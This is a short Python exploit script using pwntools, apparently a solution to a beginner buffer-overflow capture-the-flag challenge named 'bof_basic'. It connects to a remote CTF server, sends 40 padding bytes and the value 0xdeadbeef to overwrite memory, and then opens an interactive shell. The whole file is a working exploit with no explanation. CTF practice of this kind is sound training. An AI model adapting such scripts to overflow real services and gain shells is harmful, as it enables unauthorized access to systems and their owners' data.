from pwn import *

#p = process('./bof_basic')
p = remote('ctf.j0n9hyun.xyz', 3000)

payload = ''
payload += '\x90'*40
payload += p32(0xdeadbeef)

p.sendline(payload)

print p.recvuntil('shell...')

sleep(0.5)

p.interactive()
